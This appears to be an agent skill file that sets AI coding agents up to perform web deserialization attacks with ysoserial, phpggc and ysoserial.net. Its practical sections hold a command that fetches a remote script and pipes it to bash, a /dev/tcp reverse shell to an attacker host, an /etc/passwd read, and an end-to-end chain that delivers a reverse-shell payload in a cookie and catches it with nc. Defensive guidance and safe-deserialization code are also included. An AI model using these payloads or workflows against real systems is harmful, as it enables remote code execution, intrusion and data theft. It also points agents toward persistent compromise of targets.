---
name: web-deserialization
description: "Deserialization vulnerabilities arise when an application reconstructs objects from byte streams (Java), serialized strings (PHP), Base64 blobs (.NET), or pickle data (Python) supplied by the client."
origin: openclaw
version: "0.1.21"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: web-attack
  tool_count: 6
  guide_count: 5
  owasp: "A08:2021-Software Integrity Failures"
  mitre: "T1190-Exploit Public-Facing App"
---


# Skill: Web Deserialization Attacks

> **Supplementary Files**:
> - `payloads.md` -- Deserialization payloads for Java, PHP, .NET, Python, Ruby, Jackson/Fastjson, and bypass techniques
> - `test-cases.md` -- Structured test cases covering all major deserialization attack vectors (8 test cases)
> - `guides/` -- In-depth guides for Java ysoserial, PHP phpggc, cross-platform deserialization, Node.js deserialization, and .NET deserialization

## Summary

Web Deserialization skill domain covering web attack operations.

**Tools**: ysoserial, phpggc, marshalsec, ysoserial.net, gadgetprobe, jackson-deserialization

**Domain**: web-attack

**OWASP**: A08:2021-Software Integrity Failures

**MITRE ATT&CK**: T1190-Exploit Public-Facing App

## Description

Deserialization vulnerabilities arise when an application reconstructs objects from byte streams (Java), serialized strings (PHP), Base64 blobs (.NET), or pickle data (Python) supplied by the client. The root cause is that deserialization can invoke arbitrary class constructors, magic methods (`__wakeup`, `readObject`, `readResolve`), or property setters that chain together into "gadget chains" terminating in dangerous operations like `Runtime.exec()`, `file_put_contents()`, or `Process.Start()`.

These vulnerabilities are particularly dangerous because they often lead directly to unauthenticated RCE, bypass authentication mechanisms, or enable denial-of-service through resource exhaustion. Detection is challenging because serialized payloads are opaque binary or encoded data that traditional WAF rules struggle to inspect.

Key attack surfaces include:
- HTTP cookies containing serialized session data
- POST parameters with Base64-encoded object streams
- REST API endpoints accepting JSON/XML with type hints (`@class`, `__type`)
- Message queues and RPC protocols (RMI, AMQP)
- File upload handlers that deserialize embedded objects
- View state fields in web frameworks (ASP.NET `__VIEWSTATE`, JSF)

## Use Cases

1. **Java RCE via ysoserial** -- Generate CommonsCollections gadget chains to exploit Apache Commons, Spring, Hibernate, and other Java libraries
2. **PHP object injection** -- Abuse Laravel, WordPress, Magento, and custom framework gadget chains via phpggc
3. **.NET ViewState deserialization** -- Exploit machineKey disclosure or weak validation to achieve RCE via ysoserial.net
4. **Blind deserialization detection** -- Use DNS/HTTP callbacks and time delays to confirm deserialization without visible output
5. **JSON/XML deserialization** -- Exploit polymorphic deserialization in Jackson, Fastjson, and XStream
6. **Python pickle RCE** -- Craft malicious pickle payloads targeting Flask/Django session stores or IPC channels
7. **Ruby deserialization** -- Exploit ERB, Gem, and Rails gadget chains
8. **Gadget chain analysis** -- Use GadgetProbe to enumerate available classes and identify exploitable chains
9. **WAF bypass** -- Evade deserialization detection through encoding, compression, and payload obfuscation

## Core Tools

| Tool | Language | Purpose | Key Features |
|------|----------|---------|--------------|
| **ysoserial** | Java | Generate Java gadget chain payloads | 50+ gadget chains, custom command execution, file-based payloads |
| **phpggc** | PHP | Generate PHP gadget chain payloads | Laravel, WordPress, Magento, Guzzle, Monolog chains |
| **marshalsec** | Java | Deserialization research and marshalling exploits | RMI/JMX/LDAP/JRMP servers, JSON/XML marshalling |
| **ysoserial.net** | .NET | Generate .NET gadget chain payloads | ViewState, BinaryFormatter, LosFormatter, NetDataContractSerializer |
| **gadgetprobe** | Java | Enumerate classpath and identify gadget chains | DNS exfiltration, classpath mapping, chain feasibility |
| **jackson-deserialization** | Java/JSON | Jackson/Fastjson deserialization exploit toolkit | Polymorphic type handling, `@JsonTypeInfo` exploitation, CVE database |

## Methodology

### Phase 1: Detection and Fingerprinting

1. Identify serialization formats in HTTP traffic (magic bytes `0xACED` for Java, `O:` for PHP, Base64 with `AAQAA` for .NET)
2. Map input vectors: cookies, POST body, headers, file uploads, API endpoints
3. Use GadgetProbe to enumerate available classes on the target classpath via DNS callbacks
4. Confirm deserialization by injecting benign objects and observing error messages or behavior changes

### Phase 2: Gadget Chain Selection

1. Map target framework and library versions from fingerprinting data
2. Cross-reference with ysoserial/phpggc/ysoserial.net gadget chain databases
3. Select chains matching available libraries (CommonsCollections, Spring, Hibernate, etc.)
4. Consider chain reliability -- some chains are version-specific or JVM-dependent

### Phase 3: Payload Generation and Delivery

1. Generate payloads using the appropriate tool (ysoserial, phpggc, ysoserial.net)
2. Encode payload for the delivery vector (Base64, URL-encoding, gzip compression)
3. Inject payload into the identified input vector
4. Monitor for execution via OOB callbacks (DNS, HTTP) or time-based indicators

### Phase 4: Post-Exploitation

1. Confirm RCE and establish persistent access if authorized
2. Escalate from deserialization to full application compromise
3. Document chain used, libraries required, and exploit reliability

## Practical Steps

### Java Deserialization with ysoserial

```bash
# List all available gadget chains
java -jar ysoserial.jar --help

# Generate CommonsCollections5 payload for command execution
java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned' | base64 -w0

# Generate payload with URL-encoded output for GET parameters
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker/shell.sh|bash' | base64 -w0 | python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()))"

# Use JRMP client for more reliable exploitation
java -jar ysoserial.jar JRMPClient 'attacker:1099' | base64 -w0

# Start a JRMP listener to serve payloads
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'id'
```

### PHP Deserialization with phpggc

```bash
# List available gadget chains
phpggc -l

# Generate Laravel RCE1 chain
phpggc Laravel/RCE1 'system("id")'

# Generate WordPress chain with base64 wrapper
phpggc -b WordPress/Generic 'system("cat /etc/passwd")'

# URL-encode output for GET parameter injection
phpggc -u Magento/RCE2 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
```

### Blind Deserialization Detection

```bash
# DNS callback with GadgetProbe
java -cp gadgetprobe.jar GadgetProbe --dns-callback attacker.burpcollaborator.net --input serialized_data.bin

# Time-based detection (5-second delay)
java -jar ysoserial.jar CommonsCollections5 'sleep 5' | base64 -w0

# HTTP OOB callback
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker/deser-confirm' | base64 -w0
```

## Defense Perspective

### Prevention

- **Integrity checks**: Sign serialized data with HMAC; reject data with invalid signatures
- **Type whitelisting**: Only allow deserialization of expected classes; block all others
- **Replace serialization**: Use JSON or Protocol Buffers for data interchange instead of native serialization
- **Patch libraries**: Keep all libraries updated to prevent gadget chain availability
- **Input validation**: Validate all deserialized data against a strict schema before processing
- **Sandbox**: Run deserialization in a restricted security manager or sandbox environment

### Detection

- Monitor for Java serialization magic bytes (`0xACED0005`) in HTTP traffic
- Log deserialization exceptions and class-loading errors
- Deploy RASP agents to intercept `ObjectInputStream.readObject()` calls
- Use WAF rules to detect common gadget chain class names in Base64-decoded traffic
- Alert on DNS/HTTP callbacks to known exfiltration domains during deserialization attempts

### Framework-Specific Mitigations

| Framework | Mitigation |
|-----------|-----------|
| Java | Override `ObjectInputStream.resolveClass()` with whitelist; use `SerialKiller` filter |
| PHP | Disable `unserialize()` for user input; use `json_decode()` instead |
| .NET | Set `MachineKey` validation; use `AspNetEnforceViewStateMac=true`; migrate to `DataProtector` |
| Python | Never pickle untrusted data; use `json` or `safe_load` with PyYAML |
| Jackson | Disable `DEFAULT_TYPING`; use `@JsonTypeInfo(use=Id.NAME)` with whitelist |
| Ruby | Avoid `Marshal.load` on user data; use JSON with permitted classes only |

## Deserialization Risk Matrix

The risk matrix below maps deserialization attack surfaces to their typical impact, exploit complexity, and prevalence in production environments. Use this matrix during engagement scoping to prioritize testing effort.

| Attack Surface | Typical Impact | Exploit Complexity | Prevalence | Priority |
|----------------|---------------|-------------------|------------|----------|
| Java HTTP cookies / session data | RCE | Medium | High | Critical |
| PHP unserialize() in custom apps | RCE | Low | High | Critical |
| .NET ViewState (weak/missing MAC) | RCE | Low | Medium | Critical |
| .NET BinaryFormatter in APIs | RCE | Medium | Medium | High |
| Jackson/Fastjson JSON type hints | RCE | Medium | Medium | High |
| Python pickle in Flask/Django sessions | RCE | Low | Low | High |
| Ruby Marshal in Rails cookies | RCE | Medium | Medium | Medium |
| Java RMI/JMX/JMS protocols | RCE | High | Medium | High |
| PHP phar:// wrapper triggers | RCE | Medium | Low | Medium |
| Node.js node-serialize IIFE | RCE | Low | Low | Medium |
| Java Spring RPC / Hessian | RCE | High | Low | Medium |
| XStream XML deserialization | RCE | Medium | Low | Medium |

## Language-Specific Payload Strategies

Each language platform has unique serialization formats, gadget chain ecosystems, and delivery mechanisms. This section provides a quick reference for approaching deserialization exploitation by language.

### Java

- **Format**: Binary stream (magic bytes `0xACED0005`, Base64 starts with `rO0AB`)
- **Key tools**: ysoserial, marshalsec, GadgetProbe
- **Primary chains**: CommonsCollections (1-7), Spring (1-2), Hibernate (1-2), Groovy1, Jdk7u21
- **Delivery**: HTTP cookies, POST bodies, RMI/T3 protocol, JMXInvokerServlet, SOAP headers
- **Detection**: GadgetProbe DNS enumeration, time-based sleep payloads, HTTP callbacks

### PHP

- **Format**: Text-based (`O:<len>:"<class>":<count>:{...}`)
- **Key tools**: phpggc
- **Primary chains**: Laravel (RCE1-8), WordPress/Generic, Magento/RCE1-2, Monolog, Guzzle, Symfony
- **Delivery**: Cookies, POST parameters, phar:// wrapper triggers via file operations
- **Detection**: Inject `O:1:"X":0:{}` and observe "Class not found" errors

### .NET

- **Format**: Binary (Base64 starts with `AAQAA`), LosFormatter, ViewState
- **Key tools**: ysoserial.net
- **Primary chains**: ObjectDataProvider, TypeConfuseDelegate, ActivitySurrogateSelector, TextFormattingRunProperties, WindowsIdentity
- **Delivery**: `__VIEWSTATE` field, BinaryFormatter API endpoints, WCF services, remoting
- **Detection**: Identify ViewState without MAC, check for machineKey disclosure

### Python

- **Format**: Pickle bytecode (starts with `\x80` + protocol version)
- **Key tools**: Custom scripts using `pickle` stdlib module
- **Primary techniques**: `__reduce__` method overriding, eval/exec calls, subprocess.check_output
- **Delivery**: Flask/Django session cookies, Celery task queues, IPC channels, PyYAML unsafe load
- **Detection**: Check for pickle protocol bytes in cookies, test with sleep-based payloads

### Ruby

- **Format**: Marshal binary (starts with `\x04\x08`), YAML with type tags
- **Key tools**: Custom Ruby scripts, rails-cookie-decryptor
- **Primary chains**: ERB, Gem::RequestSet, Gem::Requirement, Rails cookie Marshal
- **Delivery**: Rails cookies (Marshal-serialized), YAML.load on user input, Devise remember_token
- **Detection**: Identify Rails session cookie format, test for secret_key_base disclosure

### Node.js

- **Format**: JSON with function serialization markers (`_$$ND_FUNC$$`)
- **Key tools**: Custom scripts, node-serialize exploitation
- **Primary techniques**: IIFE injection via `_$$ND_FUNC$$`, prototype pollution chains, funcster exploitation
- **Delivery**: Serialized session cookies, API endpoints accepting serialized objects, express middleware
- **Detection**: Look for node-serialize or funcster in dependency list, test with IIFE markers

## Gadget Chain Analysis

Gadget chains are sequences of method calls that connect a deserialization entry point (source) to a dangerous operation (sink). Understanding chain anatomy is essential for both exploitation and defense.

### Chain Anatomy

Every gadget chain consists of three components:

1. **Kick-off gadget**: The method invoked during deserialization. In Java, this is typically `readObject()`, `readResolve()`, or `readObjectNoData()`. In PHP, it is `__wakeup()` or `__destruct()`.

2. **Chain gadgets**: Intermediate classes that pass control from the kick-off to the sink. These are typically map/collection implementations, transformer objects, or proxy wrappers. The key property is that each gadget calls a method on the next gadget without any security checks.

3. **Sink gadget**: The final dangerous operation -- usually `Runtime.exec()`, `ProcessBuilder.start()`, `system()`, `eval()`, or `file_put_contents()`.

### Chain Discovery Process

When pre-built chains fail, manual chain discovery requires:

1. **Classpath enumeration**: Use GadgetProbe or manual JAR analysis to identify available classes
2. **Source identification**: Find classes with `readObject()`, `__wakeup()`, or equivalent that delegate to property-controlled methods
3. **Sink identification**: Find classes that execute commands, write files, or load code
4. **Chain construction**: Map a path from source to sink through available intermediate classes
5. **Payload generation**: Construct the serialized object graph that instantiates the chain

### Common Chain Patterns

| Pattern | Description | Example |
|---------|-------------|---------|
| Transformer chain | ChainedTransformer applies a series of function calls | CommonsCollections 1-7 |
| Template injection | Loads bytecode via ClassLoader from TemplatesImpl | CommonsCollections2, CommonsCollections4 |
| JNDI redirect | Deserialized object triggers remote class loading via JNDI | JRMPClient, Jdk7u21 |
| Property delegation | Object properties trigger method calls on nested objects | Spring1, Hibernate1 |
| Magic method chain | __wakeup/__destruct calls method on property that triggers next gadget | Laravel RCE chains |
| Delegate invocation | MulticastDelegate or EventHandler redirects method calls | TypeConfuseDelegate, ObjectDataProvider |

## Deserialization Detection Techniques

Detecting deserialization vulnerabilities in black-box and gray-box testing requires a systematic approach combining fingerprinting, probing, and confirmation.

### Passive Fingerprinting

Identify serialization formats in HTTP traffic without actively sending payloads:

1. **Java**: Look for Base64 strings starting with `rO0AB` in cookies, headers, or POST parameters. The raw hex `AC ED 00 05` is the Java serialization magic header.

2. **PHP**: Look for strings matching the pattern `O:<digits>:"<classname>":<count>:{...}` or `a:<count>:{...}` in cookies and parameters.

3. **.NET**: Look for Base64 strings starting with `/wE` (ViewState) or `AAQAA` (BinaryFormatter) in `__VIEWSTATE` hidden fields.

4. **Python**: Look for Base64 strings that decode to bytes starting with `\x80\x04` or `\x80\x05` (pickle protocol 4/5) in session cookies.

5. **Ruby**: Look for Base64 strings that decode to bytes starting with `\x04\x08` (Marshal format) in Rails session cookies.

### Active Probing

Inject benign payloads to confirm deserialization is occurring:

```bash
# Java: Inject minimal serialized object and watch for ClassNotFoundException
echo "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==" | base64 -d | \
  python3 -c "import sys; data=sys.stdin.buffer.read(); data=data.replace(b'HashMap',b'AAAAAAA'); import base64; print(base64.b64encode(data).decode())"

# PHP: Inject invalid class and look for error messages
curl -s http://target/ -b "data=O:1:\"X\":0:{}" | grep -i "class.*not found\|unserialize"

# .NET: Inject invalid ViewState and observe error
curl -s http://target/default.aspx -d "__VIEWSTATE=INVALID_DATA" | grep -i "viewstate\|validation"

# Python: Inject pickle with invalid class reference
python3 -c "import pickle,base64;print(base64.b64encode(pickle.dumps('test')).decode())"
```

### Confirmation via OOB Callbacks

Once deserialization is confirmed, verify code execution through out-of-band callbacks:

1. **DNS callback**: Generate payload with `nslookup <unique>.callback.domain` -- works even with restrictive firewalls
2. **HTTP callback**: Generate payload with `curl http://callback.domain/<unique>` -- confirms full network access
3. **Time delay**: Generate payload with `sleep 5` or `ping -n 6 127.0.0.1` -- works when no outbound network is allowed
4. **File system artifact**: Generate payload with `touch /tmp/<unique>` -- confirms execution when OOB is impossible

## Safe Deserialization Patterns

Understanding safe deserialization patterns is essential for both validating that mitigations are in place and for building test environments. Each platform provides mechanisms to restrict deserialization.

### Java Safe Patterns

```java
// Pattern 1: ObjectInputFilter (Java 9+)
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filterInfo -> {
    Class<?> clazz = filterInfo.serialClass();
    if (clazz == null) return ObjectInputFilter.Status.ALLOWED;
    return ALLOWED_CLASSES.contains(clazz.getName())
        ? ObjectInputFilter.Status.ALLOWED
        : ObjectInputFilter.Status.REJECTED;
});

// Pattern 2: Override resolveClass with whitelist
class SafeObjectInputStream extends ObjectInputStream {
    protected Class<?> resolveClass(ObjectStreamClass desc) {
        if (!ALLOWED_CLASSES.contains(desc.getName()))
            throw new InvalidClassException("Unauthorized deserialization", desc.getName());
        return super.resolveClass(desc);
    }
}

// Pattern 3: Replace with JSON serialization
ObjectMapper mapper = new ObjectMapper();
MyDTO dto = mapper.readValue(json, MyDTO.class); // Type-safe, no gadget chains
```

### PHP Safe Patterns

```php
// Pattern 1: Whitelist allowed classes
$data = unserialize($input, ['allowed_classes' => ['SafeClass1', 'SafeClass2']]);

// Pattern 2: Replace with JSON
$data = json_decode($input, true); // No object instantiation

// Pattern 3: Disable phar wrapper
// php.ini: phar.readonly = On
```

### .NET Safe Patterns

```xml
<!-- Pattern 1: Enforce ViewState MAC -->
<system.web>
  <pages enableViewStateMac="true" viewStateEncryptionMode="Always" />
  <machineKey validationKey="AUTO_GENERATED" decryptionKey="AUTO_GENERATED" />
</system.web>

<!-- Pattern 2: Disable BinaryFormatter -->
<!-- ASP.NET Core: BinaryFormatter is obsolete and removed -->
```

### Python Safe Patterns

```python
# Pattern 1: RestrictedUnpickler
import pickle
class SafeUnpickler(pickle.Unpickler):
    ALLOWED = {'builtins': {'dict', 'list', 'set', 'tuple', 'str', 'int', 'float'}}
    def find_class(self, module, name):
        if module in self.ALLOWED and name in self.ALLOWED[module]:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"Blocked: {module}.{name}")

# Pattern 2: Use JSON instead
import json
data = json.loads(input_string) # Safe, no code execution

# Pattern 3: Use YAML safe_load
import yaml
data = yaml.safe_load(input_string) # Only basic types
```

## Exploit Chain Building

Building exploit chains for deserialization vulnerabilities requires combining multiple techniques into a reliable attack path. This section describes the end-to-end process.

### Step 1: Reconnaissance

Identify the technology stack, serialization format, and input vectors:

```bash
# Identify web framework and language from HTTP headers
curl -sI http://target/ | grep -iE "server|x-powered-by|x-aspnet|set-cookie"

# Identify serialization format from cookie values
curl -sI http://target/ -v 2>&1 | grep -i "set-cookie" | grep -oE "[A-Za-z0-9+/=]{20,}"

# Check for common deserialization endpoints
curl -s http://target/invoker/JMXInvokerServlet -o /dev/null -w '%{http_code}'
curl -s http://target/wls-wsat/CoordinatorPortType -o /dev/null -w '%{http_code}'
curl -s http://target/api -X POST -H "Content-Type: application/x-java-serialized-object" -d "test" -w '%{http_code}'
```

### Step 2: Format Identification

Determine the exact serialization format from captured data:

```bash
# Decode and inspect suspected serialized data
echo "SUSPECT_BASE64" | base64 -d | xxd | head -5
# Java: ac ed 00 05
# .NET: 00 01 00 00 00
# Python: 80 04 or 80 05

# Extract readable strings to identify class names
echo "SUSPECT_BASE64" | base64 -d | strings | head -20
```

### Step 3: Chain Selection and Testing

Select appropriate gadget chains based on the identified format and library fingerprinting:

```bash
# Test multiple chains in parallel with unique callbacks
for chain in CommonsCollections5 CommonsCollections6 CommonsCollections7 Spring1 Hibernate1; do
  payload=$(java -jar ysoserial.jar $chain "nslookup ${chain}.attacker.com" 2>/dev/null | base64 -w0)
  curl -s -o /dev/null -w "${chain}: %{http_code} (%{time_total}s)\n" \
    -H "Cookie: data=${payload}" http://target/api
done
```

### Step 4: Payload Delivery and Execution

Deliver the working payload through the identified input vector and confirm execution:

```bash
# Generate final RCE payload
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|bash' | base64 -w0

# Deliver via identified vector
curl -s http://target/api -H "Cookie: session=FINAL_PAYLOAD" &
nc -lvnp 4444  # Catch reverse shell
```
